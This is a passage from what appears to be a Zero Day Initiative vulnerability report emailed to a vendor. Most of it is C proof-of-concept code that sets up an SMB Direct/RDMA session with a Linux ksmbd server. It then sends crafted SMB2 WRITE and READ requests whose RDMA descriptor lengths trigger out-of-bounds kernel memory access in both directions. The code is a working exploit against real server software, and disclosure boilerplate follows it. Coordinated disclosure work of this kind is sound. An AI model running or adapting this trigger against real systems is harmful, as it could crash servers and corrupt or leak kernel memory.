=09*(uint16_t *)(b + 68)  =3D 1;         /* SecurityMode =3D SIGNING_ENAB=
LED */
=09*(uint16_t *)(b + 70)  =3D 0;
=09*(uint32_t *)(b + 72)  =3D 0;         /* Capabilities  */
=09memset(b + 76, 0xA5, 16);           /* ClientGUID    */
=09*(uint32_t *)(b + 92)  =3D 0;
=09*(uint16_t *)(b + 96)  =3D 0;
=09*(uint16_t *)(b + 98)  =3D 0;
=09*(uint16_t *)(b + 100) =3D 0x0302;    /* SMB 3.0.2, passes smb2pdu.c:7=
275 */

=09if (smb2_xchg(r, pdu, 102, rsp, sizeof(rsp), &rlen))
=09=09return -1;
=09printf("S3RIG: SMB2 NEGOTIATE rsp %zu bytes status=3D0x%08x dialect=3D=
0x%04x\n",
=09       rlen, rsp_status(rsp, rlen), rlen >=3D 68 ? *(uint16_t *)(rsp +=
 68) : 0);
=09fflush(stdout);
=09return rsp_status(rsp, rlen) =3D=3D STATUS_SUCCESS ? 0 : -1;
}

/* Raw NTLMSSP: decode_negotiation_token() fails both ASN.1 decodes and t=
hen sets
 * conn->preferred_auth_mech =3D KSMBD_AUTH_NTLMSSP, use_spnego =3D false
 * (fs/smb/server/smb2pdu.c:1557-1565). */
static size_t build_ntlmssp_negotiate(uint8_t *o)
{
=09memset(o, 0, 32);
=09memcpy(o, "NTLMSSP\0", 8);
=09*(uint32_t *)(o + 8)  =3D 1;             /* NtLmNegotiate */
=09*(uint32_t *)(o + 12) =3D 0x60088215;    /* UNICODE|OEM|REQ_TARGET|NTL=
M|
=09=09=09=09=09=09  ALWAYS_SIGN|NTLMSSP_NEGOTIATE_
=09=09=09=09=09=09  EXTENDED_SESSSECURITY|128|56 */
=09/* DomainName / WorkstationName security_buffers stay zero */
=09return 32;                             /* sizeof(struct negotiate_mess=
age) */
}

/* struct authenticate_message is 64 bytes fixed (fs/smb/server/ntlmssp.h=
:129);
 * only UserName has to be present for session_user() -> ksmbd_login_user=
(). */
static size_t build_ntlmssp_auth(uint8_t *o, const char *user)
{
=09size_t nlen;

=09memset(o, 0, 64);
=09memcpy(o, "NTLMSSP\0", 8);
=09*(uint32_t *)(o + 8)  =3D 3;             /* NtLmAuthenticate */
=09nlen =3D to_utf16(o + 64, user);
=09/* security_buffer UserName at offset 8+4+8+8+8 =3D 36 */
=09*(uint16_t *)(o + 36) =3D (uint16_t)nlen;
=09*(uint16_t *)(o + 38) =3D (uint16_t)nlen;
=09*(uint32_t *)(o + 40) =3D 64;
=09*(uint32_t *)(o + 60) =3D 0x60088215;    /* NegotiateFlags */
=09return 64 + nlen;
}

static int smb2_session_setup(struct rig *r, struct trig_params *p, const=
 char *user)
{
=09uint8_t pdu[512], rsp[2048], blob[256];
=09size_t rlen =3D 0, blen;
=09uint32_t st;
=09int stage;

=09for (stage =3D 0; stage < 2; stage++) {
=09=09blen =3D stage =3D=3D 0 ? build_ntlmssp_negotiate(blob)
=09=09=09=09  : build_ntlmssp_auth(blob, user);
=09=09memset(pdu, 0, sizeof(pdu));
=09=09p->message_id++;
=09=09put_hdr((struct smb2_hdr_w *)pdu, SMB2_SESSION_SETUP_CMD, p);
=09=09*(uint16_t *)(pdu + 64) =3D 25;                    /* StructureSize=
 */
=09=09pdu[66] =3D 0;                                     /* Flags        =
 */
=09=09pdu[67] =3D 1;                                     /* SecurityMode =
 */
=09=09*(uint32_t *)(pdu + 68) =3D 0;                     /* Capabilities =
 */
=09=09*(uint32_t *)(pdu + 72) =3D 0;                     /* Channel      =
 */
=09=09*(uint16_t *)(pdu + 76) =3D SMB2_SESS_BUFFER_OFF;
=09=09*(uint16_t *)(pdu + 78) =3D (uint16_t)blen;
=09=09*(uint64_t *)(pdu + 80) =3D 0;                     /* PrevSessionId=
 */
=09=09memcpy(pdu + SMB2_SESS_BUFFER_OFF, blob, blen);

=09=09if (smb2_xchg(r, pdu, SMB2_SESS_BUFFER_OFF + blen,
=09=09=09      rsp, sizeof(rsp), &rlen))
=09=09=09return -1;
=09=09st =3D rsp_status(rsp, rlen);
=09=09if (rlen >=3D 48)
=09=09=09memcpy(&p->session_id, rsp + 40, 8);
=09=09printf("S3RIG: SESSION_SETUP[%d] status=3D0x%08x session=3D0x%llx f=
lags=3D0x%04x\n",
=09=09       stage, st, (unsigned long long)p->session_id,
=09=09       rlen >=3D 68 ? *(uint16_t *)(rsp + 66) : 0);
=09=09fflush(stdout);
=09=09if (stage =3D=3D 0 && st !=3D STATUS_MORE_PROCESSING_REQUIRED)
=09=09=09return -1;
=09=09if (stage =3D=3D 1 && st !=3D STATUS_SUCCESS)
=09=09=09return -1;
=09}
=09return 0;
}

static int smb2_tree_connect(struct rig *r, struct trig_params *p, const =
char *unc)
{
=09uint8_t pdu[512], rsp[512];
=09size_t rlen =3D 0, plen;
=09uint32_t st;

=09memset(pdu, 0, sizeof(pdu));
=09p->message_id++;
=09p->tree_id =3D 0;
=09put_hdr((struct smb2_hdr_w *)pdu, SMB2_TREE_CONNECT_CMD, p);
=09plen =3D to_utf16(pdu + SMB2_TCON_BUFFER_OFF, unc);
=09*(uint16_t *)(pdu + 64) =3D 9;
=09*(uint16_t *)(pdu + 66) =3D 0;
=09*(uint16_t *)(pdu + 68) =3D SMB2_TCON_BUFFER_OFF;
=09*(uint16_t *)(pdu + 70) =3D (uint16_t)plen;

=09if (smb2_xchg(r, pdu, SMB2_TCON_BUFFER_OFF + plen, rsp, sizeof(rsp), &=
rlen))
=09=09return -1;
=09st =3D rsp_status(rsp, rlen);
=09if (rlen >=3D 40)
=09=09memcpy(&p->tree_id, rsp + 36, 4);
=09printf("S3RIG: TREE_CONNECT '%s' status=3D0x%08x tid=3D0x%08x\n", unc,=
 st, p->tree_id);
=09fflush(stdout);
=09return st =3D=3D STATUS_SUCCESS ? 0 : -1;
}

static int smb2_create(struct rig *r, struct trig_params *p, const char *=
name,
=09=09       uint64_t *eof)
{
=09uint8_t pdu[512], rsp[1024];
=09size_t rlen =3D 0, nlen;
=09uint32_t st;

=09memset(pdu, 0, sizeof(pdu));
=09p->message_id++;
=09put_hdr((struct smb2_hdr_w *)pdu, SMB2_CREATE_CMD, p);
=09nlen =3D to_utf16(pdu + SMB2_CREATE_BUFFER_OFF, name);
=09*(uint16_t *)(pdu + 64)  =3D 57;              /* StructureSize      */
=09pdu[66] =3D 0;                                /* SecurityFlags      */
=09pdu[67] =3D 0;                                /* RequestedOplock    */
=09*(uint32_t *)(pdu + 68)  =3D 2;               /* Impersonation      */
=09*(uint64_t *)(pdu + 72)  =3D 0;
=09*(uint64_t *)(pdu + 80)  =3D 0;
=09*(uint32_t *)(pdu + 88)  =3D 0x0012019F;      /* DesiredAccess: R/W/at=
trs */
=09*(uint32_t *)(pdu + 92)  =3D 0x00000080;      /* FILE_ATTRIBUTE_NORMAL=
 */
=09*(uint32_t *)(pdu + 96)  =3D 0x00000007;      /* ShareAccess RWD    */
=09*(uint32_t *)(pdu + 100) =3D 3;               /* FILE_OPEN_IF       */
=09*(uint32_t *)(pdu + 104) =3D 0x00000040;      /* NON_DIRECTORY_FILE */
=09*(uint16_t *)(pdu + 108) =3D SMB2_CREATE_BUFFER_OFF;
=09*(uint16_t *)(pdu + 110) =3D (uint16_t)nlen;
=09*(uint32_t *)(pdu + 112) =3D 0;
=09*(uint32_t *)(pdu + 116) =3D 0;

=09if (smb2_xchg(r, pdu, SMB2_CREATE_BUFFER_OFF + nlen, rsp, sizeof(rsp),=
 &rlen))
=09=09return -1;
=09st =3D rsp_status(rsp, rlen);
=09if (rlen >=3D 144) {
=09=09memcpy(&p->persistent_fid, rsp + 128, 8);
=09=09memcpy(&p->volatile_fid,   rsp + 136, 8);
=09=09if (eof)
=09=09=09memcpy(eof, rsp + 112, 8);   /* EndofFile */
=09}
=09printf("S3RIG: CREATE '%s' status=3D0x%08x pfid=3D0x%llx vfid=3D0x%llx=
 eof=3D%llu\n",
=09       name, st, (unsigned long long)p->persistent_fid,
=09       (unsigned long long)p->volatile_fid,
=09       (unsigned long long)(eof ? *eof : 0));
=09fflush(stdout);
=09return st =3D=3D STATUS_SUCCESS ? 0 : -1;
}

/* Plain non-RDMA SMB2 READ, used to read back what the control write put=
 there. */
static int smb2_read_plain(struct rig *r, struct trig_params *p, uint32_t=
 length,
=09=09=09   uint8_t *out, size_t *outlen)
{
=09uint8_t pdu[256], rsp[2048];
=09size_t rlen =3D 0;
=09uint32_t st, dlen;
=09uint8_t doff;

=09memset(pdu, 0, sizeof(pdu));
=09p->message_id++;
=09put_hdr((struct smb2_hdr_w *)pdu, SMB2_READ_CMD, p);
=09*(uint16_t *)(pdu + 64) =3D 49;
=09pdu[66] =3D 0;
=09pdu[67] =3D 0;
=09*(uint32_t *)(pdu + 68) =3D length;
=09*(uint64_t *)(pdu + 72) =3D 0;
=09memcpy(pdu + 80, &p->persistent_fid, 8);
=09memcpy(pdu + 88, &p->volatile_fid, 8);
=09*(uint32_t *)(pdu + 96)  =3D 0;   /* MinimumCount */
=09*(uint32_t *)(pdu + 100) =3D 0;   /* Channel =3D none */
=09*(uint32_t *)(pdu + 104) =3D 0;   /* RemainingBytes */
=09*(uint16_t *)(pdu + 108) =3D 0;   /* ReadChannelInfoOffset */
=09*(uint16_t *)(pdu + 110) =3D 0;   /* ReadChannelInfoLength */
=09pdu[112] =3D 0;                   /* Buffer[0], StructureSize is odd *=
/

=09if (smb2_xchg(r, pdu, 113, rsp, sizeof(rsp), &rlen))
=09=09return -1;
=09st =3D rsp_status(rsp, rlen);
=09if (st !=3D STATUS_SUCCESS || rlen < 80) {
=09=09printf("S3RIG: plain READ status=3D0x%08x len=3D%zu\n", st, rlen);
=09=09fflush(stdout);
=09=09return -1;
=09}
=09doff =3D rsp[66];
=09memcpy(&dlen, rsp + 68, 4);
=09if ((size_t)doff + dlen > rlen)
=09=09return -1;
=09if (dlen > *outlen)
=09=09dlen =3D (uint32_t)*outlen;
=09memcpy(out, rsp + doff, dlen);
=09*outlen =3D dlen;
=09return 0;
}

/* ----------------------------------------------------------------------=
 main */

static void usage(const char *a0)
{
=09fprintf(stderr,
=09=09"usage: %s -h <server-ip> [-P <port>] [-s <unc>] [-f <file>] [-u <u=
ser>]\n"
=09=09"          [-m control|dirA|dirB|all] [-b <buflen>] [-0 <desc0>] [-=
1 <desc1>]\n",
=09=09a0);
}

int main(int argc, char **argv)
{
=09struct rig r;
=09struct trig_params p;
=09const char *host =3D NULL, *port =3D SMBD_PORT_DEFAULT;
=09const char *unc =3D NULL, *file =3D "s3-victim.bin", *user =3D "s3gues=
t";
=09const char *mode =3D "all";
=09char uncbuf[256];
=09uint8_t pdu[512], rsp[1024], back[256];
=09size_t pdulen, rlen =3D 0, blen;
=09uint64_t eof =3D 0;
=09uint32_t ctl_len =3D 64;
=09int c, rc_control =3D -1;

=09memset(&r, 0, sizeof(r));
=09memset(&p, 0, sizeof(p));
=09p.buflen    =3D TRIG_BUFLEN;
=09p.desc0_len =3D TRIG_DESC0_LEN;
=09p.desc1_len =3D TRIG_DESC1_LEN;

=09while ((c =3D getopt(argc, argv, "h:P:s:f:u:m:b:0:1:")) !=3D -1) {
=09=09switch (c) {
=09=09case 'h': host =3D optarg; break;
=09=09case 'P': port =3D optarg; break;
=09=09case 's': unc  =3D optarg; break;
=09=09case 'f': file =3D optarg; break;
=09=09case 'u': user =3D optarg; break;
=09=09case 'm': mode =3D optarg; break;
=09=09case 'b': p.buflen    =3D (uint32_t)strtoul(optarg, NULL, 0); break=
;
=09=09case '0': p.desc0_len =3D (uint32_t)strtoul(optarg, NULL, 0); break=
;
=09=09case '1': p.desc1_len =3D (uint32_t)strtoul(optarg, NULL, 0); break=
;
=09=09default: usage(argv[0]); return 2;
=09=09}
=09}
=09if (!host) { usage(argv[0]); return 2; }
=09if (!unc) {
=09=09snprintf(uncbuf, sizeof(uncbuf), "\\\\%s\\share", host);
=09=09unc =3D uncbuf;
=09}
=09if (p.desc0_len <=3D p.buflen) {
=09=09fprintf(stderr,
=09=09=09"S3RIG: desc0_len (%u) must be > buflen (%u) or rw.c:143 never c=
lamps\n",
=09=09=09p.desc0_len, p.buflen);
=09=09return 2;
=09}

=09printf("S3RIG: target %s:%s unc=3D'%s' file=3D'%s' user=3D'%s' mode=3D=
%s\n",
=09       host, port, unc, file, user, mode);
=09printf("S3RIG: params buflen=3D%u desc0=3D%u desc1=3D%u\n",
=09       p.buflen, p.desc0_len, p.desc1_len);
=09fflush(stdout);

=09if (rig_connect(&r, host, port)) {
=09=09printf("S3RIG: READINESS rxe=3Dno smbd_connected=3Dno  (rdma_cm con=
nect failed)\n");
=09=09fflush(stdout);
=09=09return 1;
=09}
=09printf("S3RIG: rdma connected via device '%s'\n", r.devname);
=09fflush(stdout);

=09if (smbd_negotiate(&r)) {
=09=09printf("S3RIG: READINESS rxe=3D%s smbd_connected=3Dno  (smbd negoti=
ate failed)\n",
=09=09       strncmp(r.devname, "rxe", 3) ? "no" : "yes");
=09=09fflush(stdout);
=09=09return 1;
=09}

=09p.mr_addr =3D (uint64_t)(uintptr_t)r.abuf;
=09p.mr_rkey =3D r.amr->rkey;
=09p.message_id =3D 0;

=09if (smb2_negotiate(&r, &p) ||
=09    smb2_session_setup(&r, &p, user) ||
=09    smb2_tree_connect(&r, &p, unc) ||
=09    smb2_create(&r, &p, file, &eof)) {
=09=09printf("S3RIG: READINESS rxe=3D%s smbd_connected=3Dno  (SMB2 stagin=
g failed)\n",
=09=09       strncmp(r.devname, "rxe", 3) ? "no" : "yes");
=09=09fflush(stdout);
=09=09return 1;
=09}

=09printf("S3RIG: READINESS rxe=3D%s smbd_connected=3Dyes\n",
=09       strncmp(r.devname, "rxe", 3) ? "no" : "yes");
=09fflush(stdout);

=09/* ---------------- B. CONTROL: a well-formed single-descriptor RDMA W=
RITE */
=09{
=09=09struct trig_params q =3D p;
=09=09uint32_t i;

=09=09for (i =3D 0; i < ctl_len; i++)
=09=09=09r.abuf[i] =3D (uint8_t)(0xC0 + (i & 0x0f));
=09=09q.message_id =3D ++p.message_id;
=09=09q.buflen     =3D ctl_len;
=09=09q.desc0_len  =3D ctl_len;      /* =3D=3D RemainingBytes: rw.c:143 d=
oes NOT clamp */
=09=09pdulen =3D build_write_trigger(pdu, sizeof(pdu), &q, 1);
=09=09if (!pdulen || smb2_xchg(&r, pdu, pdulen, rsp, sizeof(rsp), &rlen))=
 {
=09=09=09printf("S3RIG: CONTROL benign_rdma_write=3Dfail (exchange failed=
)\n");
=09=09=09fflush(stdout);
=09=09=09return 1;
=09=09}
=09=09printf("S3RIG: control WRITE status=3D0x%08x\n", rsp_status(rsp, rl=
en));
=09=09fflush(stdout);
=09=09if (rsp_status(rsp, rlen) !=3D STATUS_SUCCESS) {
=09=09=09printf("S3RIG: CONTROL benign_rdma_write=3Dfail (status)\n");
=09=09=09fflush(stdout);
=09=09=09return 1;
=09=09}
=09=09blen =3D sizeof(back);
=09=09if (smb2_read_plain(&r, &p, ctl_len, back, &blen) || blen !=3D ctl_=
len) {
=09=09=09printf("S3RIG: CONTROL benign_rdma_write=3Dfail (readback %zu by=
tes)\n", blen);
=09=09=09fflush(stdout);
=09=09=09return 1;
=09=09}
=09=09rc_control =3D memcmp(back, r.abuf, ctl_len);
=09=09printf("S3RIG: CONTROL benign_rdma_write=3D%s\n", rc_control ? "fai=
l" : "ok");
=09=09hexdump("S3RIG: control readback", back, blen > 32 ? 32 : blen);
=09=09fflush(stdout);
=09=09if (rc_control) {
=09=09=09return 1;
=09=09}
=09}

=09if (!strcmp(mode, "control")) {
=09=09printf("S3RIG: RUN-COMPLETE\n");
=09=09fflush(stdout);
=09=09return 0;
=09}

=09/* ---------------- C. THE FINDING, direction A ----------------------=
----- */
=09if (!strcmp(mode, "dirA") || !strcmp(mode, "all")) {
=09=09memset(r.abuf, 0x41, ATTACKER_MR_SIZE);
=09=09p.message_id++;
=09=09pdulen =3D build_write_trigger(pdu, sizeof(pdu), &p, 2);
=09=09printf("S3RIG: dirA SMB2 WRITE RemainingBytes=3D%u desc[0].length=
=3D%u "
=09=09       "desc[1].length=3D%u -> OOB starts at data_buf+%u\n",
=09=09       p.buflen, p.desc0_len, p.desc1_len, p.buflen);
=09=09hexdump("S3RIG: dirA PDU", pdu, pdulen);
=09=09rlen =3D 0;
=09=09if (smb2_xchg(&r, pdu, pdulen, rsp, sizeof(rsp), &rlen)) {
=09=09=09printf("S3RIG: TRIGGER dirA sent status=3DNORESPONSE "
=09=09=09       "(connection died, check the server log)\n");
=09=09=09fflush(stdout);
=09=09=09printf("S3RIG: RUN-COMPLETE\n");
=09=09=09fflush(stdout);
=09=09=09return 0;
=09=09}
=09=09printf("S3RIG: TRIGGER dirA sent status=3D0x%08x\n", rsp_status(rsp=
, rlen));
=09=09fflush(stdout);
=09}

=09/* ---------------- D. direction B -----------------------------------=
----- */
=09if (!strcmp(mode, "dirB") || !strcmp(mode, "all")) {
=09=09struct trig_params q =3D p;

=09=09/* Verifier correction: the OOB begins at aux_payload_buf +
=09=09 * ALIGN(Length, 8) (smb2pdu.c:7428), so Length must equal the file
=09=09 * size for the OOB to start at the object end. */
=09=09memset(r.abuf, 0, ATTACKER_MR_SIZE);
=09=09q.message_id =3D ++p.message_id;
=09=09/* Length =3D=3D buflen =3D=3D the file size, so ALIGN(Length,8) =
=3D=3D nbytes and
=09=09 * the OOB starts at the end of the kvmalloc().  desc[0].length mus=
t
=09=09 * still be > nbytes or rw.c:143 never clamps. */
=09=09pdulen =3D build_read_trigger(pdu, sizeof(pdu), &q, p.buflen);
=09=09printf("S3RIG: dirB SMB2 READ Length=3D%u desc[0].length=3D%u desc[=
1].length=3D%u\n",
=09=09       p.buflen, q.desc0_len, q.desc1_len);
=09=09rlen =3D 0;
=09=09if (smb2_xchg(&r, pdu, pdulen, rsp, sizeof(rsp), &rlen)) {
=09=09=09printf("S3RIG: TRIGGER dirB sent status=3DNORESPONSE\n");
=09=09=09fflush(stdout);
=09=09=09printf("S3RIG: RUN-COMPLETE\n");
=09=09=09fflush(stdout);
=09=09=09return 0;
=09=09}
=09=09printf("S3RIG: TRIGGER dirB sent status=3D0x%08x\n", rsp_status(rsp=
, rlen));
=09=09hexdump("S3RIG: dirB attacker MR after the read", r.abuf, 256);
=09=09fflush(stdout);
=09}

=09printf("S3RIG: RUN-COMPLETE\n");
=09fflush(stdout);
=09return 0;
}
```


-- CREDIT ---------------------------------------
This vulnerability was discovered by:
HYEONTAE LEE working with TrendAI Zero Day Initiative

-- FURTHER DETAILS ------------------------------

Supporting files:


If supporting files were contained with this report they are provided wit=
hin a password protected ZIP file. The password is the ZDI candidate numb=
er in the form: ZDI-CAN-XXXX where XXXX is the ID number.

Please confirm receipt of this report. We expect all vendors to remediate=
 ZDI vulnerabilities within 120 days of the reported date. If you are rea=
dy to release a patch at any point leading up to the deadline, please coo=
rdinate with us so that we may release our advisory detailing the issue. =
If the 120-day deadline is reached and no patch has been made available w=
e will release a limited public advisory with our own mitigations, so tha=
t the public can protect themselves in the absence of a patch. Please kee=
p us updated regarding the status of this issue and feel free to contact =
us at any time:

Zero Day Initiative
zdi-disclosures@trendmicro.com

The PGP key used for all ZDI vendor communications is available from:

  http://www.zerodayinitiative.com/documents/disclosures-pgp-key.asc

-- INFORMATION ABOUT THE ZDI --------------------
Established by TippingPoint and acquired by Trend Micro, the Zero Day Ini=
tiative (ZDI) neither re-sells vulnerability details nor exploit code. In=
stead, upon notifying the affected product vendor, the ZDI provides its T=
rend Micro TippingPoint customers with zero day protection through its in=
trusion prevention technology. Explicit details regarding the specifics o=
f the vulnerability are not exposed to any parties until an official vend=
or patch is publicly available.

Please contact us for further details or refer to:

  http://www.zerodayinitiative.com

-- DISCLOSURE POLICY ----------------------------

Our vulnerability disclosure policy is available online at:

  http://www.zerodayinitiative.com/advisories/disclosure_policy/
    
TREND MICRO EMAIL NOTICE
The information contained in this email and any attachments is confidenti=
al
and may be subject to copyright or other intellectual property protection=
.
If you are not the intended recipient, you are not authorized to use or
disclose this information, and we request that you notify us by reply mai=
l or
telephone and delete the original message from your mail system.
For details about what personal information we collect and why, please se=
e our Privacy Notice on our website at: [ https://www.trendmicro.com/priv=
acy]

